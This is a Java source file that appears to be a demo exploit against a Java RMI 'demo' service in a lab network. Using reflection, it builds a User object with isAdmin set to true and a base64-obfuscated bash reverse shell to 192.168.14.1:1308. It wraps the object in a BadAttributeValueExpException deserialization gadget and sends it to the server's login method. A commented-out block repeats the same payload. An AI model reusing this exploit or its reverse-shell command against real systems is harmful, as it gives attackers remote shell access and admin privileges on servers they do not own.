package rmi;

import java.lang.reflect.*;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import ysoserial.payloads.util.Reflections;
import javax.management.BadAttributeValueExpException;


public class DemoMaliciousUser {
	public static void main(String[] args)
			throws Exception {
		String serverIP = "192.168.14.155";
		int serverPort = 1099;
		System.setProperty("java.rmi.server.hostname","192.168.14.155");
		String name = "baonguyen2-evil";
		Registry registry = LocateRegistry.getRegistry(serverIP, serverPort);
	      DemoInterf demoInterf = (DemoInterf)registry.lookup("demo");
	      User user = new User();   
	      BadAttributeValueExpException b = new BadAttributeValueExpException(null);
	    	/*Reflections.setFieldValue (user, "isAdmin", true);
	    	Reflections.setFieldValue (user, "logCommand", "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE0LjEvMTMwOCAwPiYx}|{base64,-d}|{bash,-i}");
			Reflections.setFieldValue(b, "val", user);
	    	System.out.print(demoInterf.login(b));
		
		}*/
	      
	      Field isAdmin = User.class.getDeclaredField("isAdmin");
	      isAdmin.setAccessible(true);
	      isAdmin.set(user, true);
	      
	      Field logCommand = User.class.getDeclaredField("logCommand");
	      logCommand.setAccessible(true);
	      logCommand.set(user,"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE0LjEvMTMwOCAwPiYx}|{base64,-d}|{bash,-i}");
	      
	      Field val = BadAttributeValueExpException.class.getDeclaredField("val");
	      val.setAccessible(true);
	      val.set(b, user);
	      
	      System.out.print(demoInterf.login(b));

	      
	      
	}
	
}